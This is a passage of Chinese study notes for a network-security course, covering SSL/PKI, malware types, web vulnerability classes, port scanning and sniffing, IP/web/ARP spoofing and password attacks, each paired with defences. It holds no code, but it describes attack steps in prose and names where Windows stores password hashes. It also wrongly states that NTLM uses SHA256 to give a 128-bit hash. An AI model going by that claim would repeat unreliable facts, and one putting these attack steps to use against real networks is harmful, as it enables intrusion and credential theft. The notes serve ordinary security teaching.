Layer）。这是一个在传输层和应用层之间的安全通信层，在两个实体进行通信之前，先要建立SSL连接，以此实现对应用层透明的安全通信。<strong>利用PKI技术，服务器和客户端都对对方的证书进行验证，同时客户端生成会话密钥和选择消息摘要算法，利用服务器端的公钥加密会话密钥，传送给服务器，这样SSL协议就允许在浏览器和服务器之间进行加密通信。</strong>SSL利用数字证书保证通信安全，服务器端和浏览器端分别由可信的第三方颁发数字证书，这样在交易时，双方可以通过数字证书确认对方的身份。需要注意的是，SSL协议本身并不能提供对不可否认性的支持，这部分的工作必须由数字证书完成。</p><p>结合SSL协议和数字证书，PKI技术可以保证Web 交易多方面的安全需求，使Web上的交易和面对面的交易一样安全。</p><h2 id="第六章-网络攻击与防御技术"><a href="#第六章-网络攻击与防御技术" class="headerlink" title="第六章 网络攻击与防御技术"></a><strong>第六章 网络攻击与防御技术</strong></h2><h3 id="6-1-攻击技术"><a href="#6-1-攻击技术" class="headerlink" title="6.1 攻击技术"></a>6.1 攻击技术</h3><h4 id="6-1-1-计算机病毒（或称恶意代码）"><a href="#6-1-1-计算机病毒（或称恶意代码）" class="headerlink" title="6.1.1 计算机病毒（或称恶意代码）"></a>6.1.1 计算机病毒（或称恶意代码）</h4><p>•计算机病毒是一种恶意软件，可以通过感染计算机系统并在其中复制自身来破坏计算机系统、窃取信息或进行其他恶意活动。</p><p>•计算机病毒通常通过网络、移动存储设备或恶意软件等途径传播，并且可能造成广泛的破坏和损失。</p><p>计算机病毒根据其传播方式、破坏方式和功能等不同特点，可以分为以下几类主要的分类：</p><ol><li>文件感染型病毒：病毒会感染可执行文件、程序或脚本文件，一旦这些文件运行，病毒就会开始感染系统中的其他文件</li><li>引导型病毒： 感染计算机的引导扇区后，在计算机启动时加载自身到内存中，使得计算机在启动时被感染</li><li>宏病毒：这种病毒主要利用应用程序中的宏功能，感染文档和模板文件，并在用户打开这些文件时执行恶意代码。</li><li>逻辑炸弹（Logic bombs）：逻辑炸弹是一种预设条件触发的恶意代码，可能在特定条件满足时触发破坏性行为。</li><li>蠕虫（Worm）：蠕虫是一种自我复制并通过网络传播的病毒，可以迅速在网络中传播并感染大量系统。</li><li>特洛伊木马（Trojan horse）：特洛伊木马是一种伪装成正常或有用程序，但实际上含有恶意代码的病毒，常常用于窃取信息、监视用户活动等恶意行为。</li><li>Rootkit：Rootkit是植入系统内核或应用程序中的一种恶意软件，目的是隐藏自身活动，绕过系统安全控制。</li><li>勒索软件（Ransomware）：勒索软件是一种加密文件然后勒索用户赎金的恶意软件，对用户和组织造成巨大损失。</li></ol><p>（遇到了再查解释。。）</p><p>计算机病毒发展趋势：</p><ol><li><p>AI和机器学习：恶意软件作者开始利用人工智能和机器学习技术来创建更具破坏性和隐匿性的病毒。这些病毒可能能够自我学习和适应防御系统的智能对抗。</p></li><li><p>指向性攻击：针对特定目标的高度定制化攻击越来越常见，这种攻击可能采用高级持续性威胁（Advanced Persistent Threat，APT）的形式，目的是窃取高价值信息或进行网络间谍活动。</p></li><li><p>IoT和移动设备攻击：随着物联网设备和移动设备的普及，计算机病毒也开始针对这些设备进行攻击，利用它们的弱点来入侵和控制目标系统。</p></li><li><p>加密货币挖矿病毒：近年来，加密货币挖矿病毒成为较为普遍的一种类型，这种病毒会利用感染的计算机资源来挖掘加密货币，占用系统性能和资源。</p></li><li><p>社交工程和钓鱼攻击：计算机病毒作者通过社交工程手段，如伪装成合法的电子邮件或网站，诱导用户点击链接或下载附件，从而传播恶意软件。</p></li></ol><p><strong>网络攻击</strong>一般采用三种技术手段，</p><ul><li><strong>一是利用计算机病毒（或称恶意代码）；</strong></li><li><strong>二是利用系统或者程序中的漏洞，或者协议漏洞；</strong></li><li><strong>三是利用社会工程学。</strong></li></ul><h4 id="6-1-2-漏洞的基本概念"><a href="#6-1-2-漏洞的基本概念" class="headerlink" title="6.1.2 漏洞的基本概念"></a>6.1.2 漏洞的基本概念</h4><p>•漏洞（Vulnerability）是指<strong>计算机系统或软件中存在的未被发现或未被修复的安全弱点</strong>，可以被黑客或恶意用户利用来进行攻击或入侵。漏洞可能导致系统崩溃、数据泄露、远程执行命令等安全问题，对系统和用户的信息安全构成威胁。许多安全漏洞是程序错误导致的，此时可叫做安全缺陷（Security bug），但并不是所有的安全隐患都是程序安全缺陷导致的。</p><p><strong>系统漏洞</strong></p><p>系统漏洞中目前最常见的是Web漏洞，它通常是指网络系统程序上的漏洞，可能是由于代码编写者在编写代码时考虑不周全等原因而造成的漏洞，<strong>常见的Web漏洞有Sql注入、XSS漏洞、上传漏洞等</strong>，具体分类如下：</p><p>•1. XSS（Cross-Site Scripting）跨站脚本，因为缩写和CSS重叠，所以只能叫XSS。跨站脚本是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种。</p><p>•2. SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过在不同的SQL语句来实现对数据库的任意操作。</p><p>•3. CSRF（Cross-Site Request Forgery）为跨站请求伪造，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。CSRF通过伪装成受信任用户请求受信任的网站。CSRF难以防范，危险性比XSS更高。</p><p>•4. SSRF（Server-Side Request Forgery）为服务器端请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统。</p><p>•5. 文件上传漏洞是在上传文件时，如果服务器代码未对客户端上传的文件进行严格的验证和过滤，很容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）。非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被成为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p><p>•6. 命令执行应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p><p>•7. 逻辑漏洞就是指攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。其中越权访问又分为水平越权和垂直越权。</p><h4 id="6-1-3-社会工程学"><a href="#6-1-3-社会工程学" class="headerlink" title="6.1.3 社会工程学"></a>6.1.3 社会工程学</h4><p><strong>社会工程学（攻击）是指在信息安全方面操纵人的心理，使其采取行动或泄露机密信息。有别于社会科学中的社会工程，这是种以收集信息、欺诈或入侵系统为目的的信任骗局，已发展出各种技术手段，并可能用于犯罪。</strong></p><p>各类型的网络犯罪和信息安全威胁，都会用社会工程学学的技巧，尤其是在<strong>目标式攻击</strong>中使用的频率愈来愈高。网络罪犯以往只会用世界杯足球赛或情人节等标题耸动的全球事件或新闻来引诱用户，现在有其他的犯罪手法往往也搭配使用社会工程学学技巧。</p><p>•钓鱼攻击：是一种企图从电子通信中，伪装成信誉卓著的法人媒体以获得用户名、密码和信用卡信息等敏感个人资料的犯罪诈骗过程。大多数的钓鱼攻击都是伪装成银行、学校、软件公司或政府安全机构等可信服务提供者，例如FBI。</p><p>•诱饵计划：在此类型的社会工程学阴谋中，攻击者利用了人们对于例如最新电影或者热门MV的超高关注，从而对这些人进行信息挖掘。这在例如Bit torrent等P2P分享网络中很常见。</p><p>•垃圾邮件：以电子邮件包装着恶意木马程序的电子邮件入侵受害者电脑，例如主旨为美国总统大选结果的电子邮件附件却包含恶意木马程序。</p><p>•电脑蠕虫：不需附在别的程序内，用户不介入操作的情况下也能自我复制或执行。</p><p>•恶意软件。</p><h3 id="6-2-信息收集"><a href="#6-2-信息收集" class="headerlink" title="6.2 信息收集"></a>6.2 信息收集</h3><h4 id="6-2-1-扫描技术"><a href="#6-2-1-扫描技术" class="headerlink" title="6.2.1 扫描技术"></a>6.2.1 扫描技术</h4><p><strong>扫描的目的</strong></p><p>主要有三个:</p><ul><li>查看目标网络中哪些主机是存活的</li><li>查看存活的主机运行了哪些服务</li><li>查看主机提供的服务有无漏洞</li></ul><h5 id="扫描的主要分类："><a href="#扫描的主要分类：" class="headerlink" title="扫描的主要分类："></a><strong>扫描的主要分类：</strong></h5><ul><li><h6 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h6></li></ul><p>​IP扫描又叫Ping扫描，主要是通过使用系统自带工具Ping完成的</p><p>（基于ICMP协议，其主要思想就是构造一个ICMP包，发送给目的主机，从目的主机生成的响应来进行判断目标主机是否存活）</p><p><strong>Nmap</strong></p><p>Nmap是一个网络连接端口扫描软件，用来扫描目标网络主机的网络连接端口。确定哪些服务正在哪些端口上运行，从此推断运行在目标主机上的操作系统类型。它能很容易并相对较快的对目标地址空间进行ICMP Ping扫描。</p><p>Nmap的官方网址为<a href="https://nmap.org/">https://nmap.org/</a></p><ul><li><h6 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h6></li></ul><p>​<strong>端口扫描可以分为TCP扫描和UDP扫描</strong></p><p>​<strong>1. TCP端口扫描即三次握手</strong></p><p><img src="https://s2.loli.net/2024/11/10/nDifTvw7uHqh4rF.png" alt="7.png"></p><p>​1.第一次握手：客户端向服务器发送报文段1，其中的 SYN 标志位 (前文已经介绍过各种标志位的作用)的值为 1，表示这是一个用于请求发起连接的报文段，其中的序号字段 (Sequence Number，图中简写为seq)被设置为初始序号x (Initial Sequence Number，ISN)，TCP 连接双方均可随机选择初始序号。发送完报文段1之后，客户端进入 SYN-SENT 状态，等待服务器的确认。</p><p>2.第二次握手：服务器在收到客户端的连接请求后，向客户端发送报文段2作为应答，其中 ACK 标志位设置为 1，表示对客户端做出应答，其确认序号字段 (Acknowledgment Number，图中简写为小写 ack) 生效，该字段值为 x + 1，也就是从客户端收到的报文段的序号加一，代表服务器期望下次收到客户端的数据的序号。此外，报文段2的 SYN 标志位也设置为1，代表这同时也是一个用于发起连接的报文段，序号 seq 设置为服务器初始序号y。发送完报文段2后，服务器进入 SYN-RECEIVED 状态。</p><p>3.第三次握手：客户端在收到报文段2后，向服务器发送报文段3，其 ACK 标志位为1，代表对服务器做出应答，确认序号字段 ack 为 y + 1，序号字段 seq 为 x + 1。此报文段发送完毕后，双方都进入 ESTABLISHED 状态，表示连接已建立。</p><p>•<strong>第一步</strong>：客户端进程发出断开连接指令，这将导致客户端的TCP程序创建一个特殊的TCP报文段，发送到服务器。这个报文段的FIN字段被置为1，表示这是一条断开连接的报文；</p><p>•<strong>第二步</strong>：服务器接收到客户端发来的断开连接报文，向客户端回送这个报文的确认报文（ACK字段为1），告诉服务器已经接收到FIN报文，并允许断开连接；</p><p>•<strong>第三步</strong>：服务器发送完确认报文后，服务器的TCP程序创建一条自己的断开连接报文，此报文的FIN字段被置为1，然后发往客户端；</p><p>•<strong>第四步</strong>：客户端接收到服务器发来的FIN报文段，则产生一条确认报文（ACK为1），发送给服务器，告知服务器已经接收到了它的断开报文。服务器接收到这条ACK报文段后，释放TCP连接相关的资源（缓存和变量），而<strong>客户端等待一段时间后</strong>（半分钟、一分钟或两分钟），也释放处于客户端的缓存和变量；</p><p>•<strong>ACK</strong>：只有1 bit的标志位，若为1，表示这个数据段中的确认序号是有效的，即这个数据报是对之前接收到的某个报文的确认（一个TCP报文可以同时作为确认报文和传递数据报文）。</p><p>•<strong>RST</strong>：只有1 bit的标志位，若客户端向服务器的一个端口请求建立TCP连接，但是服务器的那个端口并不允许建立连接（比如没开启此端口），则服务器会回送一个TCP报文，将RST位置为1，告诉客户端不要再向这个端口发起连接；</p><p>•<strong>SYN</strong>：只有1 bit的标志位，若为1，表示这是一条建立连接的TCP报文段；</p><p>•<strong>FIN</strong>：只有1 bit的标志位，若为1，表示这是一条断开连接的TCP报文段；</p><p><strong>UDP扫描</strong></p><ul><li><p>UDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)， 该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的)。 偶尔地，某服务会响应一个UDP报文，证明该端口是open(开放的)。 如果几次重试后还没有响应，该端口就被认为是 open|filtered(开放|被过滤的)。 这意味着该端口可能是开放的，也可能包过滤器正在封锁通信。 可以用版本扫描(-sV)帮助区分真正的开放端口和被过滤的端口。</p></li><li><p>使用特定的 UDP服务客户端（如 Snmpwalk，dig或Tftp）发送UDP数据包到目标UDP网络服务之后等待确定性的响应信息。</p></li><li><h6 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h6></li></ul><p>​漏洞扫描程序的基本原理：具有漏洞的应用程序在对某些网络请求作答时，与已经安装补丁的程序有所差别；利用这些差别可以识别目标主机上的程序是否存在漏洞。</p><p>​常用的漏洞扫描工具有Nessus、OpenVAS、X-Scan等</p><h4 id="6-2-2-嗅探技术"><a href="#6-2-2-嗅探技术" class="headerlink" title="6.2.2 嗅探技术"></a>6.2.2 嗅探技术</h4><p>对攻击者来说，通过嗅探技术能以非常隐蔽的方式攫取网络中的大量敏感信息，<strong>与主动扫描相比，嗅探行为更难被察觉，也更容易操作</strong></p><h5 id="嗅探器的作用"><a href="#嗅探器的作用" class="headerlink" title="嗅探器的作用"></a>嗅探器的作用</h5><p><strong>不正当用途</strong>：</p><p> (1) 窃取机密信息，包括各种用户名和口令，电子邮件正文及附件、网络打印的文档等；</p><p> (2) 窥探底层的协议信息，如DNS的IP地址、本机IP地址、网关IP地址等；</p><p> (3) 通过嗅探器获得的数据还可以为攻击者进行中间人攻击篡改数据提供帮助。</p><p><strong>正当用途</strong>：</p><p> (1) 解释网络上传输的数据包的含义；</p><p> (2) 为网络诊断提供参考；</p><p> (3) 为网络性能分析提供参考；</p><p> (4) 发现网络入侵现象，为入侵检测提供参考；</p><p> (5) 将网络事件记入日志。</p><p><strong>常见嗅探工具</strong></p><p>•tcpdump嗅探器软件</p><p> 可以将网络中传送的数据包的包头完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助去掉无用的信息。同时也是维护的比较好的开源嗅探器软件，官方网址是<a href="http://www.tcpdump.org/%E3%80%82">http://www.tcpdump.org/。</a></p><p>•wireshark网络数据包分析工具</p><p>主要作用是捕获网络数据包，并尽可能详细地显示数据包的内容，它使用WinPCAP作为接口，直接与网卡进行数据报文交换， wireshark的官方网址是<a href="https://www.wireshark.org/%E3%80%82">https://www.wireshark.org/。</a></p><p><strong>集线器网络</strong></p><p><img src="https://s2.loli.net/2024/11/10/b12ujcUeyCz3WAi.png" alt="8.png"></p><p>假设机器A上的管理员为了维护机器C，使用了一个FTP命令向机器C进行远程登陆，</p><p>机器B上的管理员想知道究竟登陆机器C上FTP口令，仅仅需要把自己机器上的网卡置于混杂模式，并对接收到的数据帧进行分析。</p><p><strong>交换机网络</strong></p><p>几种在交换网络中实现的嗅探方法：</p><p>•MAC洪泛</p><p> 向交换机发送大量含有虚构的MAC地址和IP地址的包，使交换机无法处理如此多的信息，致使交换机进入了所谓的“打开失效”模式，也就是开始了类似于集线器的工作方式，向网络上所有机器广播数据包</p><p>•MAC欺骗</p><p> 攻击者通过将源MAC地址伪造为目标主机的源MAC地址，并将这样的数据包通过交换机发送出去，使得交换机不断的更新MAC—端口映射表，从而让交换机相信攻击者主机的MAC就是目标主机的MAC，交换机就会把本应发送给目标主机的数据包发送给攻击者</p><p>•ARP欺骗</p><p> 攻击者通过对网关和目标主机进行ARP欺骗，就可以截获两者之间的通信数据，实现嗅探的目的</p><h4 id="6-2-3-其他信息收集技术"><a href="#6-2-3-其他信息收集技术" class="headerlink" title="6.2.3 其他信息收集技术"></a>6.2.3 其他信息收集技术</h4><p><strong>利用公开服务收集信息</strong></p><pre><code> WEB与搜索引擎服务、USENET（新闻组服务）、WhoIs服务</code></pre><p><strong>网络拓扑探测</strong></p><p>​主要方法是路由跟踪，执行路由跟踪的工具是在类UNIX操作系统平台上的traceroute和Windows平台的Tracert客户端程序</p><p><strong>系统类型探测</strong></p><ul><li>利用端口扫描。</li><li>利用Banner</li><li>TCP&#x2F;IP协议栈指纹</li></ul><p>​TCP&#x2F;IP 堆栈指纹识别是对 TCP&#x2F;IP 堆栈实现的特征的远程检测。然后，参数的组合可用于推断远程机器的操作系统（也称为操作系统指纹），或合并到设备指纹中</p><h4 id="6-2-4-关于漏洞与信息收集的防范"><a href="#6-2-4-关于漏洞与信息收集的防范" class="headerlink" title="6.2.4 关于漏洞与信息收集的防范"></a>6.2.4 关于漏洞与信息收集的防范</h4><p><strong>防范网络扫描：</strong></p><p>•在防火墙及过滤设备上采用严格的过滤规则，禁止扫描的数据包进入系统。</p><p>•主机系统除了必要的网络服务外，禁止其它的网络应用程序。 </p><p>•对于只对内开放的网络服务，更改其提供服务的端口。 </p><p>•抓取扫描时的数据包，对扫描者进行反向追踪。</p><p><strong>防范嗅探</strong>：</p><p>•及时打补丁。 </p><p>•开启本机监控。</p><p>•监控本地局域网的数据帧。</p><p>•对敏感数据加密。</p><p>•使用安全的拓扑结构。</p><p>•安装ARP防火墙。</p><h3 id="6-3-网络欺骗"><a href="#6-3-网络欺骗" class="headerlink" title="6.3 网络欺骗"></a>6.3 网络欺骗</h3><h4 id="6-3-1-IP欺骗"><a href="#6-3-1-IP欺骗" class="headerlink" title="6.3.1 IP欺骗"></a>6.3.1 IP欺骗</h4><p><strong>以其它主机IP作为源IP向目标主机发送数据包</strong></p><p><strong>IP欺骗的危害：</strong></p><p>以可信任的身份与服务器建立连接和伪造源IP地址，隐藏攻击者身份，消除攻击痕迹</p><p><strong>IP 欺骗的两种表现形式：</strong></p><p>•攻击者伪造的IP地址不可达或者根本不存在。</p><p>•攻击者通过在自己发出的IP 包中填入被目标主机所信任的主机的IP来进行冒充。</p><p><strong>IP欺骗的步骤</strong></p><p>•找到一个被目标主机信任的主机；</p><p>•使被信任的主机丧失工作能力；</p><p>•伪装成被信任的主机, 向目标主机发送SYN；</p><p>•猜测或嗅探得到SYN+ACK的值；</p><p>•再向目标主机发送ACK连接建立</p><h4 id="6-3-2-电子邮件欺骗"><a href="#6-3-2-电子邮件欺骗" class="headerlink" title="6.3.2 电子邮件欺骗"></a>6.3.2 电子邮件欺骗</h4><p>•电子邮件欺骗（email spoofing）是伪造电子邮件头，导致信息看起来来源于某个人或某个地方，而实际却不是真实的源地址。</p><p>•这种欺骗发生的主要原因是由于发送电子邮件最主要的协议—简单邮件传输协议（SMTP）不包括认证机制。即使SMTP服务扩展允许SMTP客户端通过邮件服务器来商议安全级别。但这一预防措施并不是总被使用。如果预防措施没有被使用，具备必要知识的任何人都可以连接到服务器，并使用其发送邮件</p><h4 id="6-3-3-Web欺骗"><a href="#6-3-3-Web欺骗" class="headerlink" title="6.3.3 Web欺骗"></a>6.3.3 Web欺骗</h4><p>•攻击者创造了一个表面上看起来完全相同的网站，它拥有相同的网页和链接。然而，攻击者控制着假冒的Web站点，这样被攻击者浏览器和Web服务器之间的所有网络信息完全被攻击者所截获</p><p>•基本原理：在受攻击者和提供真正服务的Web服务器之间设立攻击者的Web服务器，这种攻击种类在安全问题中称为“来自中间的攻击”</p><p><strong>工作流程如下所示</strong>：</p><ul><li><p>用户点击经过改写后的 <a href="http://www.www.org/http://home.xxx1.com">http://www.www.org/http://home.xxx1.com</a> ；</p></li><li><p><a href="http://www.www.org向http//home.xxx1.com">http://www.www.org向http://home.xxx1.com</a> 请求文档；</p></li><li><p><a href="http://home.xxx1.com向http//www.www.org">http://home.xxx1.com向http://www.www.org</a> 返回文档；</p></li><li><p><a href="http://www.www.org/">http://www.www.org</a> 改写文档中的所有URL；</p></li><li><p><a href="http://www.www.org/">http://www.www.org</a> 向用户返回改写后的文档。</p></li><li><p>•修改过的文档中的所有URL都指向了<a href="http://www.org/">www.org</a> ，当用户点击任何一个链接都会直接进入 <a href="http://www.org/">www.org</a> ，而不会直接进入真正的URL</p></li><li><p>•开始攻击之前，攻击者必须以某种方式引诱受攻击者进入攻击者所创造的错误的Web。黑客往往使用下面三种方法：</p></li><li><p>•把错误的Web链接放到一个热门Web站点上； </p></li><li><p>•如果受攻击者使用基于电子邮件，那么可以将它指向错误的Web； </p></li><li><p>•创建错误的Web索引，指示给搜索引擎</p></li><li><p>•构建自己的DNS服务器，IP地址解析到攻击WEB页面，且将攻击WEB页面伪造成被假冒的页面。</p></li></ul><h4 id="6-3-4-ARP欺骗"><a href="#6-3-4-ARP欺骗" class="headerlink" title="6.3.4 ARP欺骗"></a>6.3.4 ARP欺骗</h4><p>（前文嗅探处有提）</p><p><strong>•ARP原理：</strong></p><p> 主机A要向主机B发送报文，会查询本地的ARP缓存表，找到B的IP地址对应的MAC地址后，就会通过交换机进行数据传输。如果未找到，则广播A一个ARP请求报文（携带主机A的IP地址Ia——物理地址Pa），请求IP地址为Ib的主机B回答物理地址Pb。局域网内所有主机包括B都收到ARP请求，但只有主机B识别自己的IP地址，于是向A主机发回一个ARP响应报文。其中就包含有B的MAC地址，A接收到B的应答后，就会更新本地的ARP缓存。接着使用这个MAC地址发送数据。因此，本地高速缓存的这个ARP cache表是本地网络通讯的基础，这个缓存表是动态更新的。</p><p><strong>典型的ARP欺骗分为两种：</strong></p><ul><li>对路由器ARP cache表的欺骗</li><li>对内网PC的网关欺骗。</li></ul><p>第一种ARP欺骗的原理是截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器的ARP cache中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。</p><p>第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的网关连接到Internet。从被骗PC角度看，就是上不了网了，“网络掉线了”</p><p><strong>ARP欺骗能够得以实现的主要原因有</strong>：</p><p>•ARP协议设计之初没有考虑安全问题，所以任何计算机都可以发送虚假的ARP数据包；</p><p>•ARP协议的无状态性，响应数据包和请求数据包之间没有什么关系，如果主机收到一个ARP响应却无法知道是否真的发送过对应的ARP请求；</p><p>•ARP缓存需要定时更新，给攻击者以可乘之机。</p><p>•<strong>ARP欺骗的主要环境必须是局域网，也就是说攻击者必须先取得进入局域网的合法身份才能进行ARP欺骗</strong></p><p><strong>网络执法官原理</strong>：</p><p> 在网络执法官中，要想限制某台机器上网，只要点击”网卡”菜单中的”权限”，选择指定的网卡号或在用户列表中点击该网卡所在行，从右键菜单中选择”权限”。在弹出的对话框中即可限制该用户的权限。对于未登记网卡，可以这样限定其上线：只要设定好所有已知用户（登记）后，将网卡的默认权限改为禁止上线即可阻止所有未知的网卡上线。使用这两个功能就可限制用户上网。其原理是通过ARP欺骗发给被攻击的电脑一个假的网关IP地址对应的MAC，使其找不到网关真正的MAC地址，这样就可以禁止其上网。</p><p><img src="https://s2.loli.net/2024/11/10/9L6AxnsCBMRYpqi.png" alt="9.png"></p><p><img src="https://s2.loli.net/2024/11/10/TgrSXIcZU7eVohi.png" alt="10.png"></p><h4 id="6-3-5-非技术类欺骗"><a href="#6-3-5-非技术类欺骗" class="headerlink" title="6.3.5 非技术类欺骗"></a>6.3.5 非技术类欺骗</h4><ul><li>社会工程学</li><li>垃圾搜索</li></ul><p>​•攻击者通过搜索被攻击者的废弃物，得到与攻击系统有关的信息</p><h4 id="6-3-6-关于网络欺骗的防范"><a href="#6-3-6-关于网络欺骗的防范" class="headerlink" title="6.3.6 关于网络欺骗的防范"></a>6.3.6 关于网络欺骗的防范</h4><h5 id="IP欺骗的防范"><a href="#IP欺骗的防范" class="headerlink" title="IP欺骗的防范"></a><strong>IP欺骗的防范</strong></h5><p>•抛弃基于地址的信任策略；</p><p>•进行包过滤，只信任内部主机；</p><p>•利用路由器屏蔽掉所有外部希望向内部发出的连接请求；</p><p>•使用加密传输和验证的方法；</p><p>•使用随机化的初始序列号，使得TCP序列号难以猜测。</p><h5 id="Web欺骗的防范"><a href="#Web欺骗的防范" class="headerlink" title="Web欺骗的防范"></a><strong>Web欺骗的防范</strong></h5><p><strong>短期的解决方案</strong>:</p><p>•禁止浏览器中的javascript功能，那么各类改写信息将原形毕露； </p><p>•确保浏览器的连接状态是可见的，它将给你提供当前位置的各类信息； </p><p>•时刻注意你所点击的URL链接会在位置状态行中得到正确的显示。 </p><p><strong>长期的解决方案</strong>:  </p><p>•改变浏览器，使之具有反映真实URL信息的功能，而不会被蒙蔽； </p><p>•对于通过安全连接建立的Web——浏览器对话，浏览器还应该告诉用户谁在另一端，而不只是表明一种安全连接的状态。</p><p><strong>ARP欺骗的防范</strong></p><p>•网关建立静态IP&#x2F;MAC对应关系,各主机建立MAC数据库</p><p>•建立DHCP服务器</p><p>•IDS（Intrusion Detection System，入侵检测系统）监听网络安全。</p><h3 id="6-4-口令攻击"><a href="#6-4-口令攻击" class="headerlink" title="6.4 口令攻击"></a>6.4 口令攻击</h3><h4 id="6-4-1-常见系统口令机制"><a href="#6-4-1-常见系统口令机制" class="headerlink" title="6.4.1 常见系统口令机制"></a>6.4.1 常见系统口令机制</h4><h5 id="口令的存储："><a href="#口令的存储：" class="headerlink" title="口令的存储："></a><strong>口令的存储</strong>：</h5><p>操作系统一般不存储明文口令，只保存口令散列。</p><p>可以在以下几个地方找到windows系统的口令散列：</p><p> 注册表，HKEY_LOCAL_MACHINE\SAM\SAM；</p><p> SAM文件，位置在%SystemRoot%system32\config\SAM；</p><p> 恢复盘，位置在%SystemRoot%repair</p><h5 id="口令的管理"><a href="#口令的管理" class="headerlink" title="口令的管理"></a>口令的管理</h5><p> Windows 系统使用安全账号管理器的机制来管理用户账号。<strong>安全账号管理器对账号的管理是通过安全标识进行的，安全标识在账号创建时就同时创建，一旦账号被删除，安全标识也同时被删除。</strong>安全标识是唯一的，即使是相同的用户名，在每次创建时获得的安全标识也完全不同。因此，一旦某个账号被删除，他的安全标识也就不存在了。即使重建相同的用户名账号，也会有不同的安全标识，不会保留原来的权限。</p><p><strong>Windows使用两种算法来处理明文口令，即LM算法和NTLM算法。</strong></p><p>•1) LM算法，口令转换为hash值，方法如下：</p><p> (1) 口令变成大写；</p><p> (2) 把口令变成14个字符，或截断或补齐；</p><p> (3) 这14个字符分成两个7字符；</p><p> (4) 用7个字符和DES算法加密一个64位“Magic ”；</p><p> (5) 把两个64位结果拼起来，得到128位值；</p><p> (6) 服务器保存该128位值</p><p>•2) NTLM算法，口令转换为hash值，方法如下：</p><p> (1) 把口令变成Unicode编码；</p><p> (2) 使用SHA256散列算法；</p><p> (3) 保存得到的128位散列值</p><h4 id="6-4-2-口令攻击技术"><a href="#6-4-2-口令攻击技术" class="headerlink" title="6.4.2 口令攻击技术"></a>6.4.2 口令攻击技术</h4><p><strong>根据攻击口令是否以网络连接的交互方式进行，可以将攻击分为在线口令攻击和离线口令攻击：</strong></p><ol><li>在线口令攻击：在线攻击是指在线状态下攻击者对用户口令进行的猜测试探攻击；</li><li>离线攻击：离线攻击是指攻击者通过某些手段进行任意多数量的口令猜测，采用攻击字典和攻击程序，最终获得口令。离线攻击方法是Internet上常用的攻击手段。</li></ol><p><strong>根据攻击手段是否参与实际的身份认证过程，可以将攻击分为主动口令攻击和被动口令攻击：</strong></p><ol><li>主动口令攻击又可以分为以下三种形式：</li></ol><ul><li>•字典攻击：字典攻击是一种把常见的、使用概率较高的口令集中存放在字典文件中，利用字典库中的数据不断的进行用户名和口令的反复测试。缺点是只能发现字典里存在的单词口令。</li><li>•强力攻击：尝试所有的字符组合方式，逐一去模拟口令验证过程，缺点是速度慢。</li><li>•组合攻击：综合了以上两种方法，这种攻击介于字典攻击和强力攻击之间。</li></ul><ol start="2"><li>被动口令攻击又可以分为以下三种形式：</li></ol><ul><li>•网络数据流窃听：由于认证信息要通过网络传递，且很多认证系统的口令是未经加密的明文，攻击者通过窃听网络数据，就很容易分辨出某种特定系统的认证数据，并提取出用户名和口令。</li><li>•重放(Record&#x2F;Replay)：有的系统会将认证信息进行简单加密后进行传输，如果攻击者无法用第一种方式推算出口令，可以使用截取&#x2F;重放方式。攻击者仍可以采用离线方式对口令密文实施字典攻击；</li><li>•钓鱼攻击</li></ul><p><strong>口令技术的缺点</strong>：</p><p>•大多数系统的口令是明文传送到验证服务器的，容易被截获。某些系统在建立一个加密链路后再进行口令的传输以解决此问题，如配置链路加密机。 </p><p>•口令维护的成本较高。为保证安全性，口令应当经常更换。另外为避免对口令的字典攻击，口令应当保证一定的长度，并且尽量采用随机的字符。但缺点是难于记忆。</p><p>•口令容易在输入的时候被攻击者偷窥，而且用户无法及时发现。</p><h4 id="6-4-3-关于口令攻击的防范"><a href="#6-4-3-关于口令攻击的防范" class="headerlink" title="6.4.3 关于口令攻击的防范"></a>6.4.3 关于口令攻击的防范</h4><ol><li><strong>选择安全密码</strong></li></ol><ul><li>设置足够长度的口令</li><li>口令中混合使用大小写字母、数字、特殊符号</li></ul><ol start="2"><li><strong>防止口令猜测攻击</strong></li></ol><ul><li>硬盘分区采用NTFS格式</li><li>正确设置和管理帐户</li><li>禁止不需要的服务</li><li>关闭不用的端口</li><li>禁止建立空连接</li></ul><ol start="3"><li><strong>设置安全策略</strong></li></ol><ul><li>强制密码历史。确定唯一新密码的个数，在重新使用旧密码之前，用户必须使用这些密码。</li><li>密码最长使用期限。确定在要求用户更改密码之前用户可以使用该密码的天数。其值介于 0 和 999 之间；如果该值设置为 